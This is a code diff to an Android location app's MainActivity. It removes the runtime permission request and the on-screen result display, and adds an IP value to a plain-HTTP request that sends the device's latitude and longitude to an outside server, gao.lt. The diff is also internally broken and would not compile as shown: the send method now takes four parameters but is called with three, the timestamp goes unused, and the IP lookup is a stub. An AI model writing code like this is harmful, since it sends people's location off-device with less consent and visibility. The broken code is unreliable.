@@ -16,17 +16,17 @@ import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
 public class MainActivity extends AppCompatActivity {
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
     private TextView latitudeText;
     private TextView longitudeText;
-    private TextView resultTextView;
     private final int LOCATION_REQUEST_CODE = 10001;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,13 +34,8 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         latitudeText = findViewById(R.id.latitude_text);
         longitudeText = findViewById(R.id.longitude_text);
-        resultTextView = findViewById(R.id.result_text_view);
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            startLocationUpdates();
-        } else {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, LOCATION_REQUEST_CODE);
-        }
+        startLocationUpdates();
     }
     private void startLocationUpdates() {
         LocationRequest locationRequest = LocationRequest.create();
@@ -56,45 +51,29 @@ public class MainActivity extends AppCompatActivity {
                 for (Location location : locationResult.getLocations()) {
                     String lat = String.valueOf(location.getLatitude());
                     String lon = String.valueOf(location.getLongitude());
+                    String ip = getIpAddress();
+                    sendLocationToServer(lat, lon, ip);
                     latitudeText.setText("Lat: " + lat);
                     longitudeText.setText("Lon: " + lon);
-                    sendLocationToServer(lat, lon);
                 }
             }
         };
         fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null);
     }
-    private void sendLocationToServer(String latitude, String longitude) {
+    private void sendLocationToServer(String latitude, String longitude, String ip, String timestamp) {
         new Thread(() -> {
-            HttpURLConnection urlConnection = null;
             try {
-                URL url = new URL("http://gao.lt/index.php?latitude=" + latitude + "&longitude=" + longitude);
-                urlConnection = (HttpURLConnection) url.openConnection();
-                urlConnection.setRequestMethod("GET");
-                int responseCode = urlConnection.getResponseCode();
-                String responseMessage = urlConnection.getResponseMessage();
-                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
-                StringBuilder response = new StringBuilder();
-                String line;
-                while ((line = in.readLine()) != null) {
-                    response.append(line);
-                }
-                in.close();
-                runOnUiThread(() -> {
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        resultTextView.setText("Success: " + response.toString());
-                    } else {
-                        resultTextView.setText("Failed: " + responseMessage);
-                    }
-                });
+                URL url = new URL("http://gao.lt/index.php?latitude=" + latitude + "&longitude=" + longitude + "&ip=" + ip);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.getInputStream().close();
             } catch (Exception e) {
-                runOnUiThread(() -> resultTextView.setText("Exception: " + e.getMessage()));
-            } finally {
-                if (urlConnection != null) {
-                    urlConnection.disconnect();
-                }
+                e.printStackTrace();
             }
         }).start();
+    }
+    private String getIpAddress() {
+        return "unknown";
     }
     @Override
     protected void onPause() {
